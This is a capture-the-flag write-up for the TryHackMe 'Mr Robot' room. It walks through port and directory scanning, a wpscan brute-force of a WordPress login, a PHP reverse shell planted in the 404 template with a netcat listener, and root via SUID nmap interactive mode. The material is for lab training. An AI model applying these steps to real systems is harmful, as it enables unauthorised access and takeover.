# MR Robot CTF

[Link to room](https://tryhackme.com/room/mrrobot)

echo machine-ip mrrobot >> /etc/hosts

### Enumeration
```nmap
# Nmap 7.80 scan initiated Tue Jun 23 06:44:06 2020 as: nmap -sC -sV -oN nmap.txt mrrobot.thm
Nmap scan report for mrrobot.thm (10.10.111.133)
Host is up (0.34s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE VERSION
22/tcp  closed ssh
80/tcp  open   http    Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/ssl Apache httpd (SSL-only mode)
|_http-server-header: Apache
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jun 23 06:45:03 2020 -- 1 IP address (1 host up) scanned in 57.15 seconds
```

```bash
gobuster dir -u http://mrrobot.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```gobuster
Result of gobuster
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://mrrobot.thm
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/23 07:05:02 Starting gobuster
===============================================================
/images (Status: 301)
/blog (Status: 301)
/rss (Status: 301)
/sitemap (Status: 200)
/login (Status: 302)
/0 (Status: 301)
/feed (Status: 301)
/video (Status: 301)
/image (Status: 301)
/atom (Status: 301)
/wp-content (Status: 301)
/admin (Status: 301)
/audio (Status: 301)
/intro (Status: 200)
/wp-login (Status: 200)
/css (Status: 301)
/rss2 (Status: 301)
/license (Status: 200)
/wp-includes (Status: 301)
/js (Status: 301)
/Image (Status: 301)
/rdf (Status: 301)
/page1 (Status: 301)
/readme (Status: 200)
/robots (Status: 200)
/dashboard (Status: 302)
/%20 (Status: 301)
/wp-admin
Progress: 5015 / 220561 (2.27%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/06/23 07:40:42 Finished
===============================================================
```

### Exploitation

Lets visit /robots directroy first
```
Conents of /robots:
User-agent: *
fsocity.dic
key-1-of-3.txt
```



#### 1. Key 1 ? 
> visit http://mrrobot.thm/key-1-of-3.txt to get the key

Now lets check others directories we found /readme, /license/ wp-admin 

##### /wp-admin

when entering admin in the username field i get incorrect username, so what if we try some names of character from the Mr.Robot series.

```
If we try elliot, we will get incorrect password, lets try to bruteforce it using the fsocity.dic we just found, 
but this wordlist contain 858,161 lines, so lets sort it out and remove duplicates
```

```bash
sort fsocity.dic | uniq > sorted_fsociety.dic
```

now lets bruteforce the wp-login

```bash
wpscan --url http://mrrobot.thm/wp-login -U elliot -P /path/to/sorted-wordlist -t 35
```

```
[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - elliot / ER28-0652                                                                                                                               
Trying elliot / eps1 Time: 00:06:45 <==================================================================================> (5635 / 5635) 100.00% Time: 00:06:45
[!] Valid Combinations Found:                                                                               
 | Username: elliot, Password: ER28-0652  
                                                                 
[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.                                                                         
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up                                                 
[+] Finished: Tue Jun 23 08:17:33 2020                                                                 
[+] Requests Done: 6647                                                                                    
[+] Cached Requests: 6                                                                                   
[+] Data Sent: 2.028 MB                                                                  
[+] Data Received: 38.663 MB                                                       
[+] Memory used: 195.109 MB                                                
[+] Elapsed time: 00:12:47     
```

Now lets login and try to get a reverse shell
once logged-in, we can edit the 404 page to get reverse shell, to do that go to appearance ==> editor and edit 404 template and upload php reverse shell, if you don't have reverse shell you can download it from [Github](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

after uploading reverse shell, visit http://mrrobot.thm/hello and run a netcat to listen to reverse shell
```bash
nc -lnvp 4444
````
```
listening on [any] 4444 ...
connect to [10.9.10.101] from (UNKNOWN) [10.10.123.133] 35844
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 12:51:50 up  1:52,  0 users,  load average: 0.00, 0.01, 0.22
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty;pty.spawn("/bin/bash")'
daemon@linux:/$ 
```

### Privilege Escalation

finding suid bit

```
daemon@linux:/home/robot$ find / -perm /4000 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper                                                                              
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper                                                                                 
/usr/lib/pt_chown                                                                                                                                            
daemon@linux:/home/robot$   
```

As from the hint we know its nmap lets abuse it

```
daemon@linux:/home/robot$ nmap -V
bash: nmap: command not found
daemon@linux:/home/robot$ /usr/local/bin/nmap -V

nmap version 3.81 ( http://www.insecure.org/nmap/ )
daemon@linux:/home/robot$ /usr/local/bin/nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
# id
uid=1(daemon) gid=1(daemon) euid=0(root) groups=0(root),1(daemon)
```

### Getting key 2 and key 3

```
# cd /root
# ls
firstboot_done  key-3-of-3.txt
# cat key-3-of-3.txt
04787dd???????????????????????
# cd /home
# cd robot
# ls
key-2-of-3.txt  password.raw-md5
# cat key-2-of-3.txt
822c73956??????????????????????
# 
```
